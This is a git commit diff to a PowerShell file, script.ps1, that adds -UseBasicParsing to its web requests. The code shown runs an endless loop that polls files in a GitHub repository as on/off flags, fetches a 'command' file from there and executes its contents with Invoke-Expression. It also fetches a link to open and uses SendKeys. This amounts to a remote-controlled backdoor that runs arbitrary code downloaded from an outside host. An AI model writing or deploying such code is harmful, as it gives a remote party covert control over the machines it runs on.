bdc8cc262468fd82f9f526e9c592a614f76f7be7
FraitRed <136161358+FraitRed@users.noreply.github.com>
2024-05-08 12:16:43 +0300

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -14,28 +14,28 @@ $wshell.SendKeys('{up}')
 $a = $True
 $b = $True
 while(1){
-$response = Invoke-WebRequest -Uri "https://github.com/FraitRed/g/blob/main/213"
+$response = Invoke-WebRequest -Uri "https://github.com/FraitRed/g/blob/main/213" -UseBasicParsing
 $response.Content -match 'rawLines":..(.*?)..,' | Out-Null
 $Matches[1] = $Matches[1] -replace '\\',''
 if(($Matches[1] -eq 1) -and (!$a)){
 $a = $True
 }
 if(($Matches[1] -eq 0) -and ($a)){
-$l = Invoke-WebRequest -Uri "https://github.com/FraitRed/g/blob/main/link"
+$l = Invoke-WebRequest -Uri "https://github.com/FraitRed/g/blob/main/link" -UseBasicParsing
 $l.Content -match 'rawLines":..(.*?)..,' | Out-Null
 $Matches[1] = $Matches[1] -replace '\\',''
 $link = $Matches[1]
 yut
 $a = $False
 }
-$p = Invoke-WebRequest -Uri "https://github.com/FraitRed/g/blob/main/312"
+$p = Invoke-WebRequest -Uri "https://github.com/FraitRed/g/blob/main/312" -UseBasicParsing
 $p.Content -match 'rawLines":..(.*?)..,' | Out-Null
 $Matches[1] = $Matches[1] -replace '\\',''
 if(($Matches[1] -eq 0) -and (!$b)){
 $b = $True
 }
 if(($Matches[1] -eq 1) -and ($b)){
-$c = Invoke-WebRequest -Uri "https://github.com/FraitRed/g/blob/main/command"
+$c = Invoke-WebRequest -Uri "https://github.com/FraitRed/g/blob/main/command" -UseBasicParsing
 $c.Content -match 'rawLines":..(.*?)..,.stylingDirectives' | Out-Null
 $Matches[1] = $Matches[1] -replace '\\',''
 Invoke-Expression $Matches[1]
